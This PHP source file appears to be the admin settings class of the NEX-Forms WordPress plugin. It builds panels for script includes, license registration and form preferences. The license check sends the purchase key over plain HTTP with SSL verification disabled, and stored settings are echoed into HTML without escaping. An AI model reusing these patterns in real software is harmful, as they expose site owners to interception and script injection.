	
	
	
	public function troubleshooting_options(){
		
		$output = '';	
			$output .= '<div class="dashboard-box global_settings ">';
							$output .= '<div class="dashboard-box-header">';
								$output .= '<div class="table_title"><i class="material-icons header-icon contact_mail">report_problem</i><span class="header_text ">Troubleshooting Options</span></div>';
								$output .= '
								<nav class="nav-extended dashboard_nav dashboard-box-nav">
									<div class="nav-content">
									  <ul class="tabs_nf tabs_nf-transparent">
										<li class="tab"><a class="active" href="#js_inc">Javascript Includes</a></li>
										<li class="tab"><a href="#css_inc">Stylesheet Includes</a></li>
									  </ul>
									</div>
								 </nav>';
							$output .= '</div>';
							
							$output .= '<div  class="dashboard-box-content">';
								$output .= '<div id="js_inc">';
									$output .= $this->print_js_inc();
								$output .= '</div>';
								
								$output .= '<div id="css_inc">';
									$output .= $this->print_css_inc();
								$output .= '</div>';
								
							$output .= '</div>';
						$output .= '</div>';
		return $output;
	}
	
	public function print_js_inc(){
		$script_config = get_option('nex-forms-script-config');
		$output = '';
		$output .= '
				<form name="script_config" id="script_config" action="'.admin_url('admin-ajax.php').'" method="post">
					
					
					<div class="alert alert-info">Please leave these includes if you are not a developer with the proper know-how!</div>
					
					<div class="row">
											<div class="col-sm-4">WP Core javascript</div>
											<div class="col-sm-8">
												<input type="checkbox" '.(($script_config['inc-jquery']=='1') ? 	'checked="checked"' : '').' name="inc-jquery" value="1" 	id="inc-jquery"	><label for="inc-jquery">jQuery </label><br />
												<input type="checkbox" '.(($script_config['inc-jquery-ui-core']=='1') ? 	'checked="checked"' : '').' name="inc-jquery-ui-core" value="1" 	id="inc-jquery-ui-core"	><label for="inc-jquery-ui-core">jQuery UI Core</label><br />
												<input type="checkbox" '.(($script_config['inc-jquery-ui-autocomplete']=='1') ? 	'checked="checked"' : '').' name="inc-jquery-ui-autocomplete" value="1" 	id="inc-jquery-ui-autocomplete"	><label for="inc-jquery-ui-autocomplete">jQuery UI Autocomplete</label><br />
												<input type="checkbox" '.(($script_config['inc-jquery-ui-slider']=='1') ? 	'checked="checked"' : '').' name="inc-jquery-ui-slider" value="1" 	id="inc-jquery-ui-slider"	><label for="inc-jquery-ui-slider">jQuery UI Slider</label><br />
												<input type="checkbox" '.(($script_config['inc-jquery-form']=='1') ? 	'checked="checked"' : '').' name="inc-jquery-form" value="1" 	id="inc-jquery-form"	><label for="inc-jquery-form">jQuery Form</label><br />
											</div>
											</div>
											
											<div class="row">
												<div class="col-sm-4">Extras</div>
												<div class="col-sm-8">
													<input type="checkbox" '.(($script_config['inc-datetime']=='1') ? 	'checked="checked"' : '').' name="inc-datetime" value="1" 	id="inc-datetime"	><label for="inc-datetime">Datepicker </label><br />
													<input type="checkbox" '.(($script_config['inc-moment']=='1') ? 	'checked="checked"' : '').' name="inc-moment" value="1" 	id="inc-moment"	><label for="inc-moment">Moment </label><br />
													<input type="checkbox" '.(($script_config['inc-locals']=='1') ? 	'checked="checked"' : '').' name="inc-locals" value="1" 	id="inc-locals"	><label for="inc-locals">Locals </label><br />
													
													<input type="checkbox" checked="checked" disabled="disabled" name="inc-math" value="1" 	id="inc-math"	><label for="inc-math">Math </label><br />
													<input type="checkbox" '.(($script_config['inc-colorpick']=='1') ? 	'checked="checked"' : '').' name="inc-colorpick" value="1" 	id="inc-colorpick"	><label for="inc-colorpick">Colorpicker Field </label><br />
													<input type="checkbox" '.(($script_config['inc-wow']=='1') ? 	'checked="checked"' : '').' name="inc-wow" value="1" 	id="inc-wow"	><label for="inc-wow">Animations </label><br />
													<input type="checkbox" '.(($script_config['inc-raty']=='1') ? 	'checked="checked"' : '').' name="inc-raty" value="1" 	id="inc-raty"	><label for="inc-raty">Raty Form </label><br />
													<input type="checkbox" '.(($script_config['inc-sig']=='1') ? 	'checked="checked"' : '').' name="inc-sig" value="1" 	id="inc-sig"	><label for="inc-sig">Digital Signature </label><br />
												
												</div>
											</div>
											
											<div class="row">
												<div class="col-sm-4">Plugin Dependent Javascript</div>
												<div class="col-sm-8">
													<input type="checkbox" '.(($script_config['inc-bootstrap']=='1') ? 	'checked="checked"' : '').' name="inc-bootstrap" value="1" 	id="inc-bootstrap"	><label for="inc-bootstrap">Bootstrap </label><br />
													<input type="checkbox" '.(($script_config['inc-onload']=='1') ? 	'checked="checked"' : '').' name="inc-onload" value="1" 	id="inc-onload"	><label for="inc-onload">Onload Functions </label><br />
												</div>
											</div>
											
											
											<div class="row">
												<div class="col-sm-4">Print Scripts</div>
												<div class="col-sm-8">
													<input type="checkbox" '.(($script_config['enable-print-scripts']=='' || $script_config['enable-print-scripts']=='1') ? 	'checked="checked"' : '').'  name="enable-print-scripts" value="1" 		id="enable-print-scripts"><label  for="enable-print-scripts"><strong> Use wp_print_scripts()</strong> </label>
												</div>
											</div>
					
					
					<button class="btn blue waves-effect waves-light">&nbsp;&nbsp;&nbsp;Save JS Inclusions&nbsp;&nbsp;&nbsp;</button>
					<div style="clear:both"></div>
				</form>
					';
		
		return $output;
	}
	
	public function print_css_inc(){
		$styles_config = get_option('nex-forms-style-config');
		$output = '';
		$output .= '
				<form name="style_config" id="style_config" action="'.admin_url('admin-ajax.php').'" method="post">
					
					<div class="alert alert-info">Pleas eleave these includes if you are not a developer who knows what you are doing!</div>
					
					<div class="row">
						<div class="col-sm-4">WP Core stylesheets</div>
						<div class="col-sm-8">
							<input type="checkbox" '.(($styles_config['incstyle-jquery']=='1') ? 	'checked="checked"' : '').' name="incstyle-jquery" value="1" 	id="incstyle-jquery"	> <label for="incstyle-jquery-ui">jQuery UI</label>	
						</div>
					</div>
					
					<div class="row">
						<div class="col-sm-4">Other stylesheets</div>
						<div class="col-sm-8">
							<input type="checkbox" '.(($styles_config['incstyle-bootstrap']=='1') ? 	'checked="checked"' : '').' name="incstyle-bootstrap" value="1" 	id="incstyle-bootstrap"	><label for="incstyle-bootstrap">Bootstrap</label><br />
							<input type="checkbox" '.(($styles_config['incstyle-font-awesome']=='1') ? 	'checked="checked"' : '').' name="incstyle-font-awesome" value="1" 	id="incstyle-font-awesome"	><label for="incstyle-font-awesome">Font Awesome</label><br />
							<input type="checkbox" '.(($styles_config['incstyle-animations']=='1') ? 	'checked="checked"' : '').' name="incstyle-animations" value="1" 	id="incstyle-animations"	><label for="incstyle-animations">Animations</label><br />
							
							<input type="checkbox" '.(($styles_config['incstyle-custom']=='1') ? 	'checked="checked"' : '').' name="incstyle-custom" value="1" 	id="incstyle-custom"	><label for="incstyle-custom">Custom NEX-Forms CSS</label>
						</div>
					</div>
					
					<div class="row">
						<div class="col-sm-4">Print Styles</div>
						<div class="col-sm-8">
							<input type="checkbox" '.(($styles_config['enable-print-styles']=='' || $styles_config['enable-print-styles']=='1') ? 	'checked="checked"' : '').'  name="enable-print-styles" value="1" 		id="enable-print-styles"		><label  for="enable-print-styles"><strong> Use wp_print_styles()</strong></label>
						</div>
					</div>
					
					<button class="btn blue waves-effect waves-light">&nbsp;&nbsp;&nbsp;Save CSS Inclusions&nbsp;&nbsp;&nbsp;</button>
					<div style="clear:both"></div>
				</form>
					';
		
		return $output;
	}
	

	public function license_setup(){
		
		$api_params2 = array( 'check_key' => 1,'ins_data'=>get_option('7103891'));
		$response2 = wp_remote_post( 'http://basixonline.net/activate-license-test', array('timeout'   => 30,'sslverify' => false,'body'  => $api_params2) );
		$checked = $response2['body'];
	
		$output = '';
		$output .= '<div class="dashboard-box global_settings">';
			$output .= '<div class="dashboard-box-header">';
				$output .= '<div class="table_title"><i class="material-icons header-icon">verified_user</i><span class="header_text ">NEX-Forms Registration Info</span></div>';
				$output .= '<p class="box-info"><strong>Status:</strong> '.(($checked=='true') ? '<span class="label label-success">Registered</span>' : '<span class="label label-danger">Not Registered</span>').'</p>';
			$output .= '</div>';
			
			$output .= '<div  class="dashboard-box-content activation_box">';
		
			$api_params = array( 'client_current_license_key' => 1,'key'=>get_option('7103891'));
			$response = wp_remote_post( 'http://basixonline.net/activate-license-test', array('timeout'   => 30,'sslverify' => false,'body'  => $api_params) );	
			$get_response = json_decode($response['body'],1);
			
			if($checked=='true')
				{
			
					$output .= '<div class="row">';
						$output .= '<div class="col-sm-5">';
							$output .= '<strong>Purchase Code</strong>';
						$output .= '</div>';
						$output .= '<div class="col-sm-7">';
							if($get_response['purchase_code'])
								$output .= $get_response['purchase_code'];
							else
								$output .= '<strong>License not activated for this domian. Please refresh this page and enter your purchase code when prompt.</strong>';
						$output .= '</div>';
					$output .= '</div>';
					$output .= '<div class="row">';
						$output .= '<div class="col-sm-5">';
							$output .= '<strong>Envato Username</strong>';
						$output .= '</div>';
						$output .= '<div class="col-sm-7">';
							$output .= $get_response['envato_user_name'];
						$output .= '</div>';
					$output .= '</div>';
					$output .= '<div class="row">';
						$output .= '<div class="col-sm-5">';
							$output .= '<strong>License Type</strong>';
						$output .= '</div>';
						$output .= '<div class="col-sm-7">';
							$output .= $get_response['license_type'];
						$output .= '</div>';
					$output .= '</div>';
					$output .= '<div class="row">';
						$output .= '<div class="col-sm-5">';
							$output .= '<strong>Activated on</strong>';
						$output .= '</div>';
						$output .= '<div class="col-sm-7">';
							$output .= $get_response['for_site'];
						$output .= '</div>';
					$output .= '</div>';
					
					$output .= '<div class="row">';
						$output .= '<div class="col-sm-12">';
							$output .= '
							<div class="alert alert-info">Unregistering a Puchase Code will free up the above code to be re-used on another domian. <strong>NOTE:</strong> This will make the current active site\'s registration inactive!</div>
							<button class="btn blue waves-effect waves-light deactivate_license">Unregister Puchase Code</button>';
						$output .= '</div>';
					$output .= '</div>';
					
				}
			else
				{
				$output .= '
								<div class="alert alert-info">Currenty this is a free version of NEX-Forms and as such some key features will be disabled. To <a href="http://codecanyon.net/item/nexforms-the-ultimate-wordpress-form-builder/7103891?ref=Basix" target="_blank">activate these features</a> you will need to <a href="http://codecanyon.net/item/nexforms-the-ultimate-wordpress-form-builder/7103891?ref=Basix" target="_blank"><strong>upgrade to the pro-version</strong></a></div>
				
							  <input name="purchase_code" id="purchase_code" placeholder="Enter Item Purchase Code" class="form-control" type="text">
							  <br />
							  <div class="show_code_response">
							  <div class="alert alert-success">After your <a href="http://codecanyon.net/item/nexforms-the-ultimate-wordpress-form-builder/7103891?ref=Basix" target="_blank">purchase</a> you can find your purchase code from <a href="http://codecanyon.net/downloads" target="_blank"><strong>http://codecanyon.net/downloads</strong></a>. Click on Download next to NEX-Forms and then click on "License certificate &amp; purchase code" and copy that code into the above text field and hit Register.</div>
							  </div>
						   
						
						 <button class="btn blue waves-effect waves-light verify_purchase_code " type="button">Register</button> 
						<div style="clear:both"></div>
						';
				}
		$output .= '</div>';	
	$output .= '</div>';	
			
		return $output;
	}
	
	public function preferences(){
		
		$output = '';	
		$output .= '<div class="dashboard-box global_settings field_preferences">';
							$output .= '<div class="dashboard-box-header">';
								$output .= '<div class="table_title"><i class="material-icons header-icon">favorite</i><span class="header_text ">Preferences</span></div>';
								$output .= '
								<nav class="nav-extended dashboard_nav dashboard-box-nav">
									<div class="nav-content">
									  <ul class="tabs_nf tabs_nf-transparent">
										<li class="tab"><a class="active" href="#field_pref">Fields</a></li>
										<li class="tab"><a href="#validation_pref">Validation</a></li>
										<li class="tab"><a href="#email_pref">Emails</a></li>
										<li class="tab"><a href="#other_pref">Other</a></li>
									  </ul>
									</div>
								 </nav>';
							$output .= '</div>';
							
							$output .= '<div  class="dashboard-box-content">';
								//FIELD PREFERENCES
								$output .= '<div id="field_pref">';
									$output .= $this->print_field_pref();
								$output .= '</div>';
								
								$output .= '<div id="validation_pref">';
									$output .= $this->print_validation_pref();
								$output .= '</div>';
								
								$output .= '<div id="email_pref">';
									$output .= $this->print_email_pref();
								$output .= '</div>';
								
								$output .= '<div id="other_pref">';
									$output .= $this->print_other_pref();
								$output .= '</div>';
								
							$output .= '</div>';
		  			$output .= '</div>';
		return $output;
		}
		
		public function print_field_pref(){
			$preferences = get_option('nex-forms-preferences');
			$output = '';
			$output .= '
				<form name="field-pref" id="field-pref" action="'.admin_url('admin-ajax.php').'" method="post">	
					<h5>Field Labels</h5>
						<div class="row">
							<div class="col-sm-4">Label Position</div>
							<div class="col-sm-8">
								
								<input type="radio" class="with-gap" name="pref_label_align" '.((!$preferences['field_preferences']['pref_label_align'] || $preferences['field_preferences']['pref_label_align']=='top') ? 'checked="checked"' : '').' id="pref_label_align_top" value="top">
								<label for="pref_label_align_top">Top</label>
								
								<input type="radio" class="with-gap" name="pref_label_align" id="pref_label_align_left" value="left" '.(($preferences['field_preferences']['pref_label_align']=='left') ? 'checked="checked"' : '').'>
								<label for="pref_label_align_left">Left</label>
								
								<input type="radio" class="with-gap" name="pref_label_align" id="pref_label_align_right" value="right" '.(($preferences['field_preferences']['pref_label_align']=='right') ? 'checked="checked"' : '').'>
								<label for="pref_label_align_right">Right</label>
								
								<input type="radio" class="with-gap" name="pref_label_align" id="pref_label_align_hidden" value="hidden" '.(($preferences['field_preferences']['pref_label_align']=='hidden') ? 'checked="checked"' : '').'>
								<label for="pref_label_align_hidden">Hidden</label>
							</div>
						</div>
						
						<div class="row">
							<div class="col-sm-4">Label Text Alignment</div>
							<div class="col-sm-8">
								
								<input type="radio" class="with-gap" name="pref_label_text_align" id="pref_label_text_align_left" value="align_left" '.((!$preferences['field_preferences']['pref_label_text_align'] || $preferences['field_preferences']['pref_label_text_align']=='align_left') ? 'checked="checked"' : '').'> 
								<label for="pref_label_text_align_left">Left</label>
								
								<input type="radio" class="with-gap" name="pref_label_text_align" id="pref_label_text_align_right" value="align_right" '.(($preferences['field_preferences']['pref_label_text_align']=='align_right') ? 'checked="checked"' : '').'> 
								<label for="pref_label_text_align_right">Right</label>
								
								<input type="radio" class="with-gap" name="pref_label_text_align" id="pref_label_text_align_center" value="align_center" '.(($preferences['field_preferences']['pref_label_text_align']=='align_center') ? 'checked="checked"' : '').'> 
								<label for="pref_label_text_align_center">Center</label>
							</div>
						</div>
						
						<div class="row">
							<div class="col-sm-4">Label Size</div>
							<div class="col-sm-8">
								
								<input type="radio" class="with-gap" name="pref_label_size" id="pref_label_size_sm" value="text-sm" '.(($preferences['field_preferences']['pref_label_size']=='text-sm') ? 'checked="checked"' : '').'> 
								<label for="pref_label_size_sm">Small</label>
								
								<input type="radio" class="with-gap" name="pref_label_size" id="pref_label_size_normal" value="" '.((!$preferences['field_preferences']['pref_label_size'] || $preferences['field_preferences']['pref_label_size']=='') ? 'checked="checked"' : '').'> 
								<label for="pref_label_size_normal">Normal</label>
								
								<input type="radio" class="with-gap" name="pref_label_size"  id="pref_label_size_lg" value="text-lg" '.(($preferences['field_preferences']['pref_label_size']=='text-lg') ? 'checked="checked"' : '').'>
								<label for="pref_label_size_lg">Large</label>
							</div>
						</div>
						
						<div class="row">

							<div class="col-sm-4">Show Sublabel</div>
							<div class="col-sm-8">
								<div class="switch">
									<label>
									  No
									  <input type="checkbox" '.((!$preferences['field_preferences']['pref_label_align'] || $preferences['field_preferences']['pref_label_align']=='top') ? 'checked="checked"' : '').' name="pref_sub_label">
									  <span class="lever"></span>
									  Yes
									</label>
								</div>
							</div>
						</div>
						
						
						
						<h5>Field Inputs</h5>

						<div class="row">
							<div class="col-sm-4">Input Text Alignment</div>
							<div class="col-sm-8">
								
								<input type="radio" class="with-gap" name="pref_input_text_align" id="pref_input_text_align_left" value="align_left" '.((!$preferences['field_preferences']['pref_input_text_align'] || $preferences['field_preferences']['pref_input_text_align']=='align_left') ? 'checked="checked"' : '').'> 
								<label for="pref_input_text_align_left">Left</label>
								
								<input type="radio" class="with-gap" name="pref_input_text_align" id="pref_input_text_align_right" value="align_right" '.(($preferences['field_preferences']['pref_input_text_align']=='align_right') ? 'checked="checked"' : '').'> 
								<label for="pref_input_text_align_right">Right</label>
								
								<input type="radio" class="with-gap" name="pref_input_text_align" id="pref_input_text_align_center" value="align_center" '.(($preferences['field_preferences']['pref_input_text_align']=='align_center') ? 'checked="checked"' : '').'> 
								<label for="pref_input_text_align_center">Center</label>
							</div>
						</div>
						
						<div class="row">
							<div class="col-sm-4">Input Size</div>
							<div class="col-sm-8">
								
								<input type="radio" class="with-gap" name="pref_input_size" id="pref_input_size_sm" value="input-sm" '.(($preferences['field_preferences']['pref_input_size']=='input-sm') ? 'checked="checked"' : '').'> 
								<label for="pref_input_size_sm">Small</label>
								
								<input type="radio" class="with-gap" name="pref_input_size" id="pref_input_size_normal" value="" '.((!$preferences['field_preferences']['pref_input_size'] || $preferences['field_preferences']['pref_input_size']=='') ? 'checked="checked"' : '').'> 
								<label for="pref_input_size_normal">Normal</label>
								
								<input type="radio" class="with-gap" name="pref_input_size"  id="pref_input_size_lg" value="input-lg" '.(($preferences['field_preferences']['pref_input_size']=='input-lg') ? 'checked="checked"' : '').'> 
								<label for="pref_input_size_lg">Large</label>
							</div>
						</div>
						
						<button class="btn blue waves-effect waves-light">&nbsp;&nbsp;&nbsp;Save Field Preferences&nbsp;&nbsp;&nbsp;</button>
						<div style="clear:both"></div>
					</form>
					';
		return $output;	
		}
		
		
		public function print_validation_pref(){
			$preferences = get_option('nex-forms-preferences');
			$output = '';
			$output .= '
				<form name="validation-pref" id="validation-pref" action="'.admin_url('admin-ajax.php').'" method="post">	
					<div class="row">
						<div class="col-sm-4">Required Field</div>
						<div class="col-sm-8">
							<input type="text" name="pref_requered_msg" class="form-control" value="'.(($preferences['validation_preferences']['pref_requered_msg']) ? $preferences['validation_preferences']['pref_requered_msg'] : 'Required').'">
						</div>
					</div>
					
					<div class="row">
						<div class="col-sm-4">Incorect Email</div>
						<div class="col-sm-8">
							<input type="text" name="pref_email_format_msg" class="form-control" value="'.(($preferences['validation_preferences']['pref_email_format_msg']) ? $preferences['validation_preferences']['pref_email_format_msg'] : 'Invalid email address').'">
						</div>
					</div>
					<div class="row">
						<div class="col-sm-4">Incorect Phone Number</div>
						<div class="col-sm-8">
							<input type="text" name="pref_phone_format_msg" class="form-control" value="'.(($preferences['validation_preferences']['pref_phone_format_msg']) ? $preferences['validation_preferences']['pref_phone_format_msg'] : 'Invalid phone number').'">
						</div>
					</div>
					<div class="row">
						<div class="col-sm-4">Incorect URL</div>
						<div class="col-sm-8">
							<input type="text" name="pref_url_format_msg" class="form-control" value="'.(($preferences['validation_preferences']['pref_url_format_msg']) ? $preferences['validation_preferences']['pref_url_format_msg'] : 'Invalid URL').'">
						</div>
					</div>
					
					<div class="row">
						<div class="col-sm-4">Numerical</div>
						<div class="col-sm-8">
							<input type="text" name="pref_numbers_format_msg" class="form-control" value="'.(($preferences['validation_preferences']['pref_numbers_format_msg']) ? $preferences['validation_preferences']['pref_numbers_format_msg'] : 'Only numbers are allowed').'">
						</div>
					</div>
					
					<div class="row">
						<div class="col-sm-4">Alphabetical</div>
						<div class="col-sm-8">
							<input type="text" name="pref_char_format_msg" class="form-control" value="'.(($preferences['validation_preferences']['pref_char_format_msg']) ? $preferences['validation_preferences']['pref_char_format_msg'] : 'Only text are allowed').'">
						</div>
					</div>
					
					<div class="row">
						<div class="col-sm-4">Incorect File Extension</div>
						<div class="col-sm-8">
							<input type="text" name="pref_invalid_file_ext_msg" class="form-control" value="'.(($preferences['validation_preferences']['pref_invalid_file_ext_msg']) ? $preferences['validation_preferences']['pref_invalid_file_ext_msg'] : 'Invalid file extension').'">
						</div>
					</div>
					
					<div class="row">
						<div class="col-sm-4">Maximum File Size Exceded</div>
						<div class="col-sm-8">
							<input type="text" name="pref_max_file_exceded" class="form-control" value="'.(($preferences['validation_preferences']['pref_max_file_exceded']) ? $preferences['validation_preferences']['pref_max_file_exceded'] : 'Maximum File Size of {x}MB Exceeded').'">
						</div>
					</div>
					<div class="row">
						<div class="col-sm-4">Maximum Size for All Files Exceded</div>
						<div class="col-sm-8">
							<input type="text" name="pref_max_file_af_exceded" class="form-control" value="'.(($preferences['validation_preferences']['pref_max_file_af_exceded']) ? $preferences['validation_preferences']['pref_max_file_af_exceded'] : 'Maximum Size for all files can not exceed {x}MB').'">
						</div>
					</div>
					<div class="row">
						<div class="col-sm-4">Maximum File Upload Limit Exceded</div>
						<div class="col-sm-8">
							<input type="text" name="pref_max_file_ul_exceded" class="form-control" value="'.(($preferences['validation_preferences']['pref_max_file_ul_exceded']) ? $preferences['validation_preferences']['pref_max_file_ul_exceded'] : 'Only a maximum of {x} files can be uploaded').'">
						</div>
					</div>	
					<button class="btn blue waves-effect waves-light">&nbsp;&nbsp;&nbsp;Save Validation Preferences&nbsp;&nbsp;&nbsp;</button>
					<div style="clear:both"></div>
				</form>
				';
			
		return $output;	
		}
		
		public function print_email_pref(){
			$preferences = get_option('nex-forms-preferences');
			$output = '';
			$output .= '
				<form name="emails-pref" id="emails-pref" action="'.admin_url('admin-ajax.php').'" method="post">	
					
					<h5>Email Notifications (Admin emails)</h5>
															
															<div class="row">
																<div class="col-sm-4">From Address</div>
																<div class="col-sm-8">
																	<input type="text" name="pref_email_from_address" class="form-control" value="'.(($preferences['email_preferences']['pref_email_from_address']) ? $preferences['email_preferences']['pref_email_from_address'] : get_option('admin_email')).'">
																</div>
															</div>
															
															<div class="row">
																<div class="col-sm-4">From Name</div>
																<div class="col-sm-8">
																	<input type="text" name="pref_email_from_name" class="form-control" value="'.(($preferences['email_preferences']['pref_email_from_name']) ? $preferences['email_preferences']['pref_email_from_name'] : get_option('blogname')).'">
																</div>
															</div>
															
															<div class="row">
																<div class="col-sm-4">Recipients</div>
																<div class="col-sm-8">
																	<input type="text" name="pref_email_recipients" class="form-control" value="'.(($preferences['email_preferences']['pref_email_recipients']) ? $preferences['email_preferences']['pref_email_recipients'] : get_option('admin_email')).'">
																</div>
															</div>
															
															<div class="row">
																<div class="col-sm-4">Subject</div>
																<div class="col-sm-8">
																	<input type="text" name="pref_email_subject" class="form-control" value="'.(($preferences['email_preferences']['pref_email_subject']) ? $preferences['email_preferences']['pref_email_subject'] : get_option('blogname').' NEX-Forms submission').'">
																</div>
															</div>
															
															<div class="row">
																<div class="col-sm-4">Mail Body</div>
																<div class="col-sm-8">
																	<textarea name="pref_email_body" placeholder="Enter {{nf_form_data}} to display all submitted data from the form in a table" class="materialize-textarea">'.(($preferences['email_preferences']['pref_email_body']) ? $preferences['email_preferences']['pref_email_body'] : '{{nf_form_data}}').'</textarea>
																</div>
															</div>
															
															<h5>Email Autoresponder (User emails)</h5>
															
															
															
															<div class="row">
																<div class="col-sm-4">Subject</div>
																<div class="col-sm-8">
																	<input type="text" name="pref_user_email_subject" class="form-control" value="'.(($preferences['email_preferences']['pref_user_email_subject']) ? $preferences['email_preferences']['pref_user_email_subject'] : get_option('blogname').' NEX-Forms submission').'">
																</div>
															</div>
															
															<div class="row">
																<div class="col-sm-4">Mail Body</div>
																<div class="col-sm-8">
																	<textarea name="pref_user_email_body" placeholder="Enter {{nf_form_data}} to display all submitted data from the form in a table" class="materialize-textarea">'.(($preferences['email_preferences']['pref_user_email_body']) ? $preferences['email_preferences']['pref_user_email_body'] : 'Thank you for connecting with us. We will respond to you shortly.').'</textarea>
																</div>
															</div>
					
					<button class="btn blue waves-effect waves-light">&nbsp;&nbsp;&nbsp;Save Email Preferences&nbsp;&nbsp;&nbsp;</button>
					<div style="clear:both"></div>
				</form>
				';
			
		return $output;	
		}
		
		public function print_other_pref(){
			$preferences = get_option('nex-forms-preferences');
			$output = '';
			$output .= '
				<form name="other-pref" id="other-pref" action="'.admin_url('admin-ajax.php').'" method="post">	
					
					<div class="row">
						<div class="col-sm-4">On-screen confirmation message</div>
						<div class="col-sm-8">
							<textarea name="pref_other_on_screen_message" class="materialize-textarea">'.(($preferences['other_preferences']['pref_other_on_screen_message']) ? $preferences['other_preferences']['pref_other_on_screen_message'] : 'Thank you for connecting with us. We will respond to you shortly.').'</textarea>
						</div>
					</div>
						
					<button class="btn blue waves-effect waves-light">&nbsp;&nbsp;&nbsp;Save Other Preferences&nbsp;&nbsp;&nbsp;</button>
					<div style="clear:both"></div>
				</form>
				';
			
		return $output;	
		}
	
	
	
	}	
}
?>